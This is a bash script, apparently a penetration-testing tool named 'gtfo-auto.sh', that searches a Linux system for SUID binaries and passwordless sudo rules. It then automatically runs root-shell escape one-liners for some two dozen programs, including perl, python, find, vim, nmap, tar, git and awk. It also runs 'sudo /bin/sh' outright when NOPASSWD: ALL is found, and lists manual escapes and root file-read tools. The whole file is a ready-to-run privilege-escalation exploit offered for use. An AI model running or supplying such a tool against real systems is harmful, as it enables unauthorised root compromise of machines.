#!/bin/bash
# gtfo-auto.sh - Extended SUID + Sudo GTFOBin Scanner & Auto-Exploiter

echo "================================================"
echo "  gtfo-auto.sh - GTFOBin Auto-Exploiter"
echo "================================================"

exploit_bin() {
    local bin=$1
    local name=$(basename "$bin")
    local prefix=""

    if [ "$2" == "sudo" ]; then
        prefix="sudo"
    fi

    case $name in
        bash|sh|dash)
            echo "[+] Exploiting $bin"
            $prefix $bin -p
            ;;
        perl)
            echo "[+] Exploiting $bin"
            $prefix $bin -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/sh";'
            ;;
        python|python2|python3|python3.*)
            echo "[+] Exploiting $bin"
            $prefix $bin -c 'import os; os.setuid(0); os.system("/bin/sh")'
            ;;
        find)
            echo "[+] Exploiting $bin"
            $prefix $bin . -exec /bin/sh \;
            ;;
        vim|vi|view|vimdiff)
            echo "[+] Exploiting $bin"
            $prefix $bin -c ':!/bin/sh'
            ;;
        nmap)
            echo "[+] Exploiting $bin"
            echo 'os.execute("/bin/sh")' > /tmp/nmap_shell.nse
            $prefix $bin --script=/tmp/nmap_shell.nse
            ;;
        awk|gawk|mawk)
            echo "[+] Exploiting $bin"
            $prefix $bin 'BEGIN {system("/bin/sh")}'
            ;;
        tclsh|wish)
            echo "[+] Exploiting $bin"
            $prefix $bin <<< 'exec /bin/sh'
            ;;
        ruby)
            echo "[+] Exploiting $bin"
            $prefix $bin -e 'exec "/bin/sh"'
            ;;
        lua|lua5.*)
            echo "[+] Exploiting $bin"
            $prefix $bin -e 'os.execute("/bin/sh")'
            ;;
        node)
            echo "[+] Exploiting $bin"
            $prefix $bin -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
            ;;
        php|php7*|php8*)
            echo "[+] Exploiting $bin"
            $prefix $bin -r 'pcntl_exec("/bin/sh");'
            ;;
        env)
            echo "[+] Exploiting $bin"
            $prefix $bin /bin/sh
            ;;
        tar)
            echo "[+] Exploiting $bin"
            $prefix $bin -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
            ;;
        zip)
            echo "[+] Exploiting $bin"
            TF=$(mktemp -u)
            $prefix $bin $TF /etc/hosts -T --unzip-command="sh -c /bin/sh"
            ;;
        gcc|cc)
            echo "[+] Exploiting $bin"
            $prefix $bin -wrapper /bin/sh,-s .
            ;;
        make)
            echo "[+] Exploiting $bin"
            COMMAND='/bin/sh' $prefix $bin -s --eval="\$(COMMAND)"
            ;;
        socat)
            echo "[+] Exploiting $bin"
            $prefix $bin stdin exec:/bin/sh
            ;;
        strace)
            echo "[+] Exploiting $bin"
            $prefix $bin -o /dev/null /bin/sh
            ;;
        taskset)
            echo "[+] Exploiting $bin"
            $prefix $bin 1 /bin/sh
            ;;
        xargs)
            echo "[+] Exploiting $bin"
            $prefix $bin -a /dev/null sh
            ;;
        git)
            echo "[+] Exploiting $bin"
            PAGER='sh -c "exec sh 0<&1"' $prefix $bin -p help
            ;;
        screen)
            echo "[+] Exploiting $bin"
            $prefix $bin -D -m sh -c /bin/sh
            ;;
        # ─── Interactive / semi-manual (print hint only) ───────────────────
        less|more)
            echo "[!] $bin found — run manually: $prefix $bin /etc/passwd then type !/bin/sh"
            ;;
        man)
            echo "[!] $bin found — run manually: $prefix $bin man then type !/bin/sh"
            ;;
        ftp)
            echo "[!] $bin found — run manually: $prefix $bin then type !/bin/sh"
            ;;
        ed)
            echo "[!] $bin found — run manually: $prefix $bin then type !/bin/sh"
            ;;
        # ─── File read (no shell, but useful for loot) ─────────────────────
        cp|mv|tee|dd|curl|wget|base64|cat)
            echo "[!] $bin found — file read/write as root possible. No auto-shell; use manually."
            ;;
        *)
            ;;
    esac
}

# ─────────────────────────────────────────────
# SECTION 1: SUID SCAN
# ─────────────────────────────────────────────
echo ""
echo "[*] Scanning for SUID binaries..."
suid_bins=$(find / -perm -4000 -type f 2>/dev/null)

if [ -z "$suid_bins" ]; then
    echo "[-] No SUID binaries found."
else
    for bin in $suid_bins; do
        exploit_bin "$bin" "suid"
    done
fi

# ─────────────────────────────────────────────
# SECTION 2: SUDO -l PARSING
# ─────────────────────────────────────────────
echo ""
echo "[*] Checking sudo privileges..."
sudo_output=$(sudo -l 2>/dev/null)

if [ -z "$sudo_output" ]; then
    echo "[-] No sudo privileges found."
else
    # Check for NOPASSWD: ALL first
    if echo "$sudo_output" | grep -q "NOPASSWD.*ALL"; then
        echo "[+] NOPASSWD: ALL detected! Running: sudo /bin/sh"
        sudo /bin/sh
    fi

    # Parse individual allowed binaries
    echo "$sudo_output" | grep -oP '(?<=NOPASSWD: )/\S+' | while read bin; do
        if [ -f "$bin" ]; then
            echo "[*] Found sudo NOPASSWD binary: $bin"
            exploit_bin "$bin" "sudo"
        fi
    done
fi

echo ""
echo "[*] Done."
